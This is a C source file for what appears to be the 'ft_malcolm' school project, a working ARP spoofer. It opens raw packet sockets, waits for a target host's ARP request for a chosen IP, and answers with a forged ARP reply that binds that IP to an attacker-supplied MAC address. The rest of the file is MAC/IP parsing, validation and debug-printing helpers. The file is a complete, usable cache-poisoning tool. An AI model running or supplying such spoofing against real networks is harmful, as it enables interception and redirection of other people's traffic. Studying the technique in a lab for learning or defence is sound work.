#include "../libft/libft.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>


/* Type definitions */
typedef in_addr_t           Addr;
typedef struct in_addr      InAddr;
typedef struct addrinfo     AddrInfo;
typedef struct sockaddr     SockAddr;
typedef struct sockaddr_in  Sockaddr_in;
typedef struct sockaddr_ll  Sockaddr_ll;
typedef struct ifaddrs     IfAddrs;
typedef struct ethhdr       EthHdr;
typedef struct ether_arp    EtherArp;

/* Buffer sizes for various operations */
#define BUFF_SIZE 1024

/* ARP reply packet size */
#define ARP_REPLY_SIZE (sizeof(EthHdr) + sizeof(EtherArp))

typedef struct MalcolmSender {
    int         sock;                                       /* Raw socket (sending) */
    Sockaddr_ll addr_ll;                                    /* Link-layer socket address */
} MalcolmSender;

/* Main context structure */
typedef struct MalcolmCtx {
    MalcolmSender   sender;                                 /* Sender structure */
    int             sock;                                   /* Raw socket (listening) */
    Addr            src_ip;                                 /* Source IP address */
    u8              src_mac[ETH_ALEN];                      /* Source MAC address */
    Addr            target_ip;                              /* Target IP address */
    u8              target_mac[ETH_ALEN];                   /* Target MAC address */
    u8              arp_reply_packet[ARP_REPLY_SIZE];       /* ARP reply packet */
} MalcolmCtx;

/* Structure to map interface flags to their names */
typedef struct StatusIffAddr {
    u32     flag;
    char    *name;
} StatusIffAddr;

/* Array of interface flags and their names */
#define IFF_FLAGS_ARR (StatusIffAddr[]) {\
    { IFF_UP, "IFF_UP" },\
    { IFF_BROADCAST, "IFF_BROADCAST" },\
    { IFF_DEBUG, "IFF_DEBUG" },\
    { IFF_LOOPBACK, "IFF_LOOPBACK" },\
    { IFF_POINTOPOINT, "IFF_POINTOPOINT" },\
    { IFF_NOTRAILERS, "IFF_NOTRAILERS" },\
    { IFF_RUNNING, "IFF_RUNNING" },\
    { IFF_NOARP, "IFF_NOARP" },\
    { IFF_PROMISC, "IFF_PROMISC" },\
    { IFF_ALLMULTI, "IFF_ALLMULTI" },\
    { IFF_MASTER, "IFF_MASTER" },\
    { IFF_SLAVE, "IFF_SLAVE" },\
    { IFF_MULTICAST, "IFF_MULTICAST" },\
    { IFF_PORTSEL, "IFF_PORTSEL" },\
    { IFF_AUTOMEDIA, "IFF_AUTOMEDIA" },\
    { IFF_DYNAMIC, "IFF_DYNAMIC" },\
    { 0, NULL }\
};


/**
 * @brief Convert a single hexadecimal character to its binary value
 * @param c Hexadecimal character (0-9, a-f, A-F)
 * @return Binary value of the hexadecimal character (0-15), or 0 for invalid
 */
u8 hex_byte_to_bin(char c) {
    if (c >= '0' && c <= '9') {
        return (c - '0');
    } else if (c >= 'a' && c <= 'f') {
        return (c - 'a' + 10);
    } else if (c >= 'A' && c <= 'F') {
        return (c - 'A' + 10);
    } else {
        return (0);
    }
}


/**
 * @brief Convert a MAC address string to a byte array
 * @param mac_str MAC address string in the format "xx:xx:xx:xx:xx:xx"
 * @param mac_bytes Output byte array to store the converted MAC address
 */
void mac_addr_str_to_bytes(const char *mac_str, unsigned char *mac_bytes) {
    for (int i = 0; i < 6; i++) {
        u8 byte = hex_byte_to_bin(mac_str[i * 3]);
        mac_bytes[i] = (byte << 4) | hex_byte_to_bin(mac_str[i * 3 + 1]);
    }

    DBG("Converted MAC string %s\n", mac_str);
    DBG(" to bytes %02x:%02x:%02x:%02x:%02x:%02x\n",
         mac_bytes[0], mac_bytes[1], mac_bytes[2],
         mac_bytes[3], mac_bytes[4], mac_bytes[5]);
}

/**
 * @brief Convert a MAC address from byte array to string format
 * @param mac Pointer to the MAC address byte array
 * @param buf Pointer to the buffer where the string representation will be stored
 */
void mac_addr_byte_to_str(unsigned char *mac, char *buf) {
    sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2],
            mac[3], mac[4], mac[5]);
}

/**
 * @brief Debug function to display ARP packet details
 * @param buffer Pointer to the packet buffer
 * @param len Length of the packet
 */
void dbg_display_arp_packet(const unsigned char *buffer, ssize_t len) {

        // DBG("Packet received, length: %zd bytes\n\n", len);

        EthHdr *eth = (EthHdr *) buffer;
        (void)len;
        if (ntohs(eth->h_proto) == ETH_P_ARP) {

            DBG("=== Ethernet Header ===\n\n");

            char dest_mac[32] = {};
            char src_mac[32] = {};
            mac_addr_byte_to_str(eth->h_dest, dest_mac);
            mac_addr_byte_to_str(eth->h_source, src_mac);

            DBG("\tDestination MAC : %s\n", dest_mac);
            DBG("\tSource MAC      : %s\n", src_mac);
            DBG("\tProtocol (hex)  : 0x%04x\n\n", ntohs(eth->h_proto));
            DBG("Received ARP packet, protocol: 0x%04x\n", ntohs(eth->h_proto));

            EtherArp *arp = (EtherArp *)(buffer + sizeof(EthHdr));
            DBG("=== ARP Header ===\n");
            DBG("\tHardware type   : %u\n", ntohs(arp->ea_hdr.ar_hrd));
            DBG("\tProtocol type   : 0x%04x\n", ntohs(arp->ea_hdr.ar_pro));
            DBG("\tHW size         : %u\n", arp->ea_hdr.ar_hln);
            DBG("\tProtocol size   : %u\n", arp->ea_hdr.ar_pln);
            DBG("\tOpcode          : %u (%s)\n",
                   ntohs(arp->ea_hdr.ar_op),
                   (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) ? "request" :
                   (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY)   ? "reply"   : "other");


            char sender_ip[INET_ADDRSTRLEN];
            char target_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp->arp_spa, sender_ip, sizeof(sender_ip));
            inet_ntop(AF_INET, arp->arp_tpa, target_ip, sizeof(target_ip));


            char s_mac[32] = {};
            char t_mac[32] = {};
            mac_addr_byte_to_str(arp->arp_sha, s_mac);
            mac_addr_byte_to_str(arp->arp_tha, t_mac);

            DBG("\tSender MAC      : %s\n", s_mac);
            DBG("\tSender IP       : %s\n", sender_ip);
            DBG("\tTarget MAC      : %s\n", t_mac);
            DBG("\tTarget IP       : %s\n", target_ip);

            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) {
                DBG("ARP Request: Who has %s? Tell %s\n", target_ip, sender_ip);
            }
        } 
}

/**
 * @brief Check if the ARP request matches the context
 * @param c Pointer to the MalcolmCtx structure containing context information
 * @param arp_spa Sender Protocol Address from the ARP packet
 * @param arp_tpa Target Protocol Address from the ARP packet
 * @return s8 TRUE if the request matches, FALSE otherwise
 */
s8 is_match_request(MalcolmCtx *c, unsigned char *arp_spa, unsigned char *arp_tpa) {
    // if (*(Addr *)arp_spa == c->target_ip && *(Addr *)arp_tpa == c->src_ip &&
    //     ft_strcmp(s_mac, c->target_mac_str) == 0) 
    // set_log_level(L_WARN);

    char *tpa = ft_strdup(inet_ntoa(*(InAddr *)arp_tpa));
    char *spa = ft_strdup(inet_ntoa(*(InAddr *)arp_spa));
    INFO("Received ARP Request: Who has %s? Tell %s\n", tpa, spa);
    free(tpa);
    free(spa);

    if (*(Addr *)arp_tpa == c->src_ip) {
        return (TRUE);
    }
    return (FALSE);
}


/**
 * @brief Initialize the MalcolmSender structure with a raw socket
 * @param sender Pointer to the MalcolmSender structure to initialize
 * @param interface_name Name of the network interface to bind the socket to
 */
void init_malcolm_sender(MalcolmSender *sender, const char* interface_name ) {
    sender->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sender->sock == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    DBG("Successfully opened socket: %i\n", sender->sock);

    u32 ifindex = if_nametoindex(interface_name);
    if (ifindex == 0) {
        perror("if_nametoindex");
        close(sender->sock);
        exit(EXIT_FAILURE);
    }
    DBG("Successfully got interface index: %i\n", ifindex);

    ft_bzero(&sender->addr_ll, sizeof(sender->addr_ll));
    sender->addr_ll.sll_family = AF_PACKET;
    sender->addr_ll.sll_protocol = htons(ETH_P_ALL);
    sender->addr_ll.sll_ifindex = ifindex;
    sender->addr_ll.sll_hatype = ARPHRD_ETHER;
    sender->addr_ll.sll_pkttype = PACKET_OUTGOING;
    sender->addr_ll.sll_halen = ETH_ALEN;
    DBG("Initialized MalcolmSender on device %s\n", interface_name);
}


/**
 * @brief Send a raw ARP reply packet using the provided context
 * @param c Pointer to the MalcolmCtx structure containing context information
 * @return s8 TRUE on success, FALSE on failure
 */
s8 send_raw_packet(MalcolmCtx *c) {

    ft_memcpy(c->sender.addr_ll.sll_addr, c->src_mac, ETH_ALEN);

    errno = 0;
    ssize_t bytes_sent = sendto(c->sender.sock, c->arp_reply_packet, ARP_REPLY_SIZE, 0, (SockAddr*)&c->sender.addr_ll, sizeof(c->sender.addr_ll));
    if (bytes_sent == -1) {
        perror("sendto");
        return (FALSE);
    }
    
    INFO("Packet sent successfully: %zd bytes\n", bytes_sent);
    return (TRUE);
}

/**
 * @brief Build an ARP reply packet based on the provided context
 * @param c Pointer to the MalcolmCtx structure containing context information
 * @param buff Pointer to the buffer where the ARP reply packet will be constructed
 */
void build_packet(MalcolmCtx *c, unsigned char *buff) {
    EthHdr eth_resp;

    ft_memcpy(eth_resp.h_dest, c->target_mac, ETH_ALEN);
    ft_memcpy(eth_resp.h_source, c->src_mac, ETH_ALEN);
    eth_resp.h_proto = htons(ETH_P_ARP);

    EtherArp arp_hdr_resp;
    arp_hdr_resp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr_resp.ea_hdr.ar_pro = htons(ETH_P_IP);
    arp_hdr_resp.ea_hdr.ar_hln = ETH_ALEN;
    arp_hdr_resp.ea_hdr.ar_pln = 4;
    arp_hdr_resp.ea_hdr.ar_op = htons(ARPOP_REPLY);
   
    ft_memcpy(arp_hdr_resp.arp_spa, &c->src_ip, 4);
    ft_memcpy(arp_hdr_resp.arp_tpa, &c->target_ip, 4);
    ft_memcpy(arp_hdr_resp.arp_tha, c->target_mac, ETH_ALEN);
    ft_memcpy(arp_hdr_resp.arp_sha, c->src_mac, ETH_ALEN);


    DBG(YELLOW"=== ARP Reply Packet BUILD ===\n"RESET);
    // unsigned char buff[BUFF_SIZE] = {};
    ft_memcpy(buff, &eth_resp, sizeof(EthHdr));
    ft_memcpy(buff + sizeof(EthHdr), &arp_hdr_resp, sizeof(EtherArp));
    DBG("-----------------------------------------------------------------------------------------------\n");
    dbg_display_arp_packet(buff, sizeof(EthHdr) + sizeof(EtherArp));
    DBG("-----------------------------------------------------------------------------------------------\n");

}

/**
 * @brief Process incoming ARP requests and send replies if they match the context
 * @param c Pointer to the MalcolmCtx structure containing context information
 * @param buffer Pointer to the received packet buffer
 * @param len Length of the received packet
 */
void process_arp_request(MalcolmCtx *c, const unsigned char *buffer, ssize_t len) {

    EthHdr      *eth = (EthHdr *) buffer;
    EtherArp    arp_hdr = *(EtherArp *)(buffer + sizeof(EthHdr));

    if (len < (ssize_t)(sizeof(EthHdr) + sizeof(EtherArp))) {
        DBG("Packet too short to contain ARP header\n");
        return;
    } else if (ntohs(eth->h_proto) != ETH_P_ARP) {
        DBG("Not an ARP packet, protocol: 0x%04x\n", ntohs(eth->h_proto));
        return;
    }

    if (ntohs(arp_hdr.ea_hdr.ar_op) == ARPOP_REQUEST) {
        if (is_match_request(c, arp_hdr.arp_spa, arp_hdr.arp_tpa)) {
            DBG(GREEN"*** Matched ARP packet ***\n\n"RESET);
            DBG(YELLOW"=== SENDING ARP Reply Packet ===\n"RESET);
            if  (!send_raw_packet(c)) {
                ERR("Failed to send ARP reply packet\n");
                exit(1);
            }
            exit(0);
        } else {
            DBG("Src IP: %d, Ctx Src IP: %d\n", *(Addr*)arp_hdr.arp_spa, c->target_ip);
            DBG("Target IP: %d, Ctx Target IP: %d\n", *(Addr*)arp_hdr.arp_tpa, c->src_ip);
            DBG("ARP packet does not match context\n\n");
        }
    }
}

/**
 * @brief Listen for ARP packets and process them
 * @param c Pointer to the MalcolmCtx structure containing context information
 */
void listen_arp(MalcolmCtx *c) {
    char buffer[BUFF_SIZE] = {}; /*Buffer for Ethernet Frame*/


    DBG("Server started, entering initialiation phase...\n");

    errno = 0;
    c->sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (c->sock == -1) {
        perror("socket:");
        exit(1);
    }
    DBG("Successfully opened socket: %i\n", c->sock);

    INFO("Starting ARP listener...\n");

    while (1) {
        errno = 0;
        ssize_t length = recvfrom(c->sock, buffer, BUFF_SIZE, 0, NULL, NULL);
        if (length == -1) {
            perror("recvfrom:");
            exit(1);
        }
        
        DBG("Received packet of length: %ld\n", length);
        DBG("-----------------------------------------------------------------------------------------------\n");
        dbg_display_arp_packet((unsigned char *)buffer, length);
        DBG("-----------------------------------------------------------------------------------------------\n");

        process_arp_request(c, (unsigned char *)buffer, length);
        ft_bzero(buffer, BUFF_SIZE);
    }
}

/**
 * @brief Display interface flags in a human-readable format
 * @param flag Interface flags
 */
void display_iff_flag(u32 flag) {
    char buffer[1024] = {};
    int idx = 0;

    StatusIffAddr iff_flag_array[] = IFF_FLAGS_ARR;

    for (int i = 0; iff_flag_array[i].flag != 0; i++) {
        if (flag & iff_flag_array[i].flag) {
            idx += sprintf(buffer + idx, " %s", iff_flag_array[i].name);
        }
    }
    DBG("FLAG: %s\n", buffer);
}


/**
 * @brief Check if the interface is a broadcast interface
 * @param flag Interface flags
 * @return s8 TRUE if the interface is a broadcast, FALSE otherwise
 */
s8 is_broadcast_if(u32 flag) {
    return (flag & IFF_BROADCAST);
}

/**
 * @brief Check if the interface is a loopback interface
 * @param flag Interface flags
 * @return s8 TRUE if the interface is a loopback, FALSE otherwise
 */
s8 is_loopback_if(u32 flag) {
    return (flag & IFF_LOOPBACK);
}

/**
 * @brief Check if the interface is up
 * @param flag Interface flags
 * @return s8 TRUE if the interface is up, FALSE otherwise
 */
s8 is_up_if(u32 flag) {
    return (flag & IFF_UP);
}

/**
 * @brief Debug function to display interface information
 * @param ifa Pointer to the IfAddrs structure containing interface information
 */
void display_ifaddrs(IfAddrs *ifa) {
    
    DBG("--------------------------------------------------------------------------------------\n");

    if (ifa->ifa_addr->sa_family == AF_INET) {
        Sockaddr_in *addr = (Sockaddr_in *)ifa->ifa_addr;
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
        DBG("Interface: %s, Address: %s\n", ifa->ifa_name, ip);
        DBG("Flags: 0x%x\n", ifa->ifa_flags);
        display_iff_flag(ifa->ifa_flags);
        if (ifa->ifa_netmask) {
            Sockaddr_in *netmask = (Sockaddr_in *)ifa->ifa_netmask;
            char nm[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &netmask->sin_addr, nm, sizeof(nm));
            DBG("Netmask: %s\n", nm);
        }
        if (ifa->ifa_broadaddr) {
            Sockaddr_in *broadaddr = (Sockaddr_in *)ifa->ifa_broadaddr;
            char ba[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &broadaddr->sin_addr, ba, sizeof(ba));
            DBG("Broadcast Address: %s\n", ba); 
        }
    }
}

/**
 *	@brief Get process ipv4 address
 *	@return in_addr_t ipv4 address of the process
*/
s8 get_interface_name(char *interface_name) {
    IfAddrs *ifa_head, *current;

    errno = 0;
    if (getifaddrs(&ifa_head) == -1) {
        perror("getifaddrs");
        return (0);
    }

    for (current = ifa_head; current != NULL; current = current->ifa_next) {
        if (current->ifa_addr && current->ifa_addr->sa_family == AF_INET) {
            display_ifaddrs(current);
            if (is_up_if(current->ifa_flags) && is_broadcast_if(current->ifa_flags) && !is_loopback_if(current->ifa_flags)) {
                INFO("Listening on interface: %s\n", current->ifa_name);
                ft_strlcpy(interface_name, current->ifa_name, ft_strlen(current->ifa_name) + 1);
                break;
            }
        }
    }
    DBG("--------------------------------------------------------------------------------------\n");
    freeifaddrs(ifa_head);
    return (1);
}


/* Ip address string format to bin format */
Addr ipv4_str_toaddr(char *str) {
    InAddr addr;

    /* Convert presentation format to binary network format */
    if (inet_pton(AF_INET, str, &addr) <= 0) {
        return (0);
    }
    return (addr.s_addr);
}

/**
 *	@brief Get ipv4 address from hostname
 *	@param hostname hostname to convert
 *	@return ipv4 address
*/
Addr hostname_to_ipv4_addr(char *hostname) {
    AddrInfo hints = {0};
    AddrInfo *result = NULL;
    Sockaddr_in *sockaddr_ipv4;
    Addr addr = 0;

    /* Initialize hints structure */
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    /* Resolve hostname to IP address */
    int status = getaddrinfo(hostname, NULL, &hints, &result);
    if (status != 0) {
        WARN("getaddrinfo error for %s: %s\n", hostname, gai_strerror(status));
        return (0);
    }

    /* Extract IPv4 address from first result */
    if (result && result->ai_family == AF_INET) {
        sockaddr_ipv4 = (Sockaddr_in *)result->ai_addr;
        addr = sockaddr_ipv4->sin_addr.s_addr;
    }

    /* Free the allocated memory */
    freeaddrinfo(result);
    return (addr);
}

/**
 *	@Brief get destination address
 *	@param dest_str destination address string (ipv4 or hostname) [input]
 *	@param dest_addr pointer on destination address [output]
*/
s8 is_ipv4_addr(char *dest_str, Addr *dest_addr) {
	/* get ipv4 address of destination addr */
	*dest_addr = ipv4_str_toaddr(dest_str);
    #ifdef MALCOLM_BONUS
        if (*dest_addr == 0) {
            *dest_addr = hostname_to_ipv4_addr(dest_str);
            if (*dest_addr == 0) {
                WARN( "'%s' Name or service not known\n", dest_str);
                return (FALSE);
            }
        }
    #else
        if (*dest_addr == 0) {
            WARN( "'%s' Invalid IP address format\n", dest_str);
            return (FALSE);
        }
    #endif
	return (TRUE);
}

/**
 * @brief Check if a character is a valid hexadecimal character
 * @param c Character to check
 * @return s8 TRUE if the character is hexadecimal, FALSE otherwise
 */
s8 is_hexa_char(char c) {
    return ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'));
}

/**
 * @brief Validate if a string is a valid MAC address
 * @param mac MAC address string to validate
 * @return s8 TRUE if the MAC address is valid, FALSE otherwise
 */
s8 is_mac_addr(char *mac) {

    int count_colon = count_char(mac, ':');

    if (count_colon != 5) {
        DBG("MAC address must have 5 colons\n");
        return (FALSE);
    }

    char **splited = ft_split((char *)mac, ':');
    if (!splited)
        return (FALSE);

    if (double_char_size(splited) != 6) {
        DBG("MAC address must have 6 octets\n");
        free_double_char(splited);
        return (FALSE);
    }

    for (int i = 0; i < 6; i++) {
        if (ft_strlen(splited[i]) != 2) {
            DBG("MAC address octet %d must be 2 characters\n", i + 1);
            free_double_char(splited);
            return (FALSE);
        }
        if (!is_hexa_char(splited[i][0]) || !is_hexa_char(splited[i][1])) {
            DBG("MAC address octet %d must be hexadecimal\n", i + 1);
            free_double_char(splited);
            return (FALSE);
        }
    }
    free_double_char(splited);
    return (TRUE);
}

/**
 * @brief Test function for is_mac_addr
 */
void test_mac_addr_func() {

    char *valid_mac = "01:23:45:67:89:ab";
    char *invalid_mac1 = "01:23:45:67:89";        // Too few octets
    char *invalid_mac2 = "01:23:45:67:89:gh";     // Invalid hex character
    char *invalid_mac3 = "01:23:45:67:89:ab:cd";  // Too many octets
    char *invalid_mac4 = "01-23-45-67-89-ab";     // Wrong delimiter
    char *invalid_mac5 = "0123:45:67:89:ab";    // Octet too long
    char *invalid_mac6 = "01:2:45:67:89:ab";     // Octet too short

    INFO("Testing valid MAC address '%s': %s\n", valid_mac, is_mac_addr(valid_mac) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac1, is_mac_addr(invalid_mac1) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac2, is_mac_addr(invalid_mac2) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac3, is_mac_addr(invalid_mac3) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac4, is_mac_addr(invalid_mac4) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac5, is_mac_addr(invalid_mac5) ? GREEN"Valid"RESET : RED"Invalid"RESET);
    INFO("Testing invalid MAC address '%s': %s\n", invalid_mac6, is_mac_addr(invalid_mac6) ? GREEN"Valid"RESET : RED"Invalid"RESET);

}

/**
 * @brief Parse command-line input arguments and populate the MalcolmCtx structure
 * @param c Pointer to the MalcolmCtx structure to populate
 * @param argv Command-line arguments
 */
void parse_input(MalcolmCtx *c, char **argv) {
    void *dst = NULL;
    
    for (int i = 1; i < 5; i++) {
        DBG("Argument %d: %s\n", i, argv[i]);
        if (i == 1 || i == 3) {
            dst = i == 1 ? &c->src_ip : &c->target_ip;
            if (!is_ipv4_addr(argv[i], dst)) {
                ERR("Invalid IPv4 address: (%s)\n", argv[i]);
                exit(EXIT_FAILURE);
            }
        } else {
            if (!is_mac_addr(argv[i])) {
                ERR("Invalid MAC address: (%s)\n", argv[i]);
                exit(EXIT_FAILURE);
            }
            dst = i == 2 ? c->src_mac : c->target_mac;
            mac_addr_str_to_bytes(argv[i], dst);
        }
    }
}

/* Debug function to display the current context */
void display_ctx(MalcolmCtx *c) {
    char src_ip_str[INET_ADDRSTRLEN];
    char target_ip_str[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, &c->src_ip, src_ip_str, sizeof(src_ip_str));
    inet_ntop(AF_INET, &c->target_ip, target_ip_str, sizeof(target_ip_str));

    INFO("Context:\n");
    INFO("  Source IP   : %s\n", src_ip_str);
    INFO("  Target IP   : %s\n", target_ip_str);
    
    INFO("  Source MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n",
        c->src_mac[0], c->src_mac[1], c->src_mac[2],
        c->src_mac[3], c->src_mac[4], c->src_mac[5]);
        
    INFO("  Target MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n\n",
        c->target_mac[0], c->target_mac[1], c->target_mac[2],
        c->target_mac[3], c->target_mac[4], c->target_mac[5]);
}

/* Main function to run the Malcolm ARP spoofer */
void ft_malcolm(MalcolmCtx *c) {
    char interface_name[BUFF_SIZE] = {};
    s8 ret = get_interface_name(interface_name);
    if (!ret) {
        ERR("Failed to get network interface\n");
        exit(EXIT_FAILURE);
    }

    INFO("Using interface: %s\n", interface_name);
    build_packet(c, c->arp_reply_packet);
    init_malcolm_sender(&c->sender, interface_name);

    listen_arp(c);
}

int main(int argc, char **argv) {
    MalcolmCtx ctx = {0};

    set_log_level(L_DEBUG);

    if (argc != 5) {
        ERR("Usage: %s <source ip> <source mac> <target ip> <target mac>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    parse_input(&ctx, argv);
    display_ctx(&ctx);
    ft_malcolm(&ctx);
    return (0);
}
